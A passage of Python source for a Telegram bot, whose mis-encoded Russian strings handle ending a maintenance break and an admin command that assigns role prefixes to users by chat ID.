        bot.reply_to(message, response, parse_mode='Markdown')
        bot.send_message(
            ADMIN_CHAT_ID,
            f"‚úÖ *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –æ—Ç–∫–ª—é—á—ë–Ω*\nüë§ *–û—Ç–∫–ª—é—á–∏–ª*: {chat_id}",
            parse_mode='Markdown'
        )
        for tech_id in get_tech_assistants():
            if tech_id != chat_id:
                try:
                    bot.send_message(tech_id, response, parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Ç–µ—Ö–ø–æ–º–æ—â–Ω–∏–∫–∞ {tech_id}: {e}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞!*", parse_mode='Markdown')

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/adprefix –æ—Ç {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üìù *–í–≤–µ–¥–∏—Ç–µ Chat ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_adprefix_chat_id(m, username))

def process_adprefix_chat_id(message, username):
    chat_id = str(message.chat.id)
    user_chat_id = sanitize_input(message.text)
    logger.info(f"Chat ID –¥–ª—è adprefix: {user_chat_id} –æ—Ç {chat_id}")
    if not user_chat_id or not user_chat_id.isdigit():
        bot.reply_to(message, "‚ùå *Chat ID –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üìù *–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø—Ä–µ—Ñ–∏–∫—Å (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ê–¥–º–∏–Ω, –¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫)*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_adprefix_prefix(m, user_chat_id, username))

def process_adprefix_prefix(message, user_chat_id, username):
    chat_id = str(message.chat.id)
    prefix = sanitize_input(message.text)
    logger.info(f"–ü—Ä–µ—Ñ–∏–∫—Å {prefix} –¥–ª—è {user_chat_id} –æ—Ç {chat_id}")
    if not prefix:
        bot.reply_to(message, "‚ùå *–ü—Ä–µ—Ñ–∏–∫—Å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    valid_prefixes = ['–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å
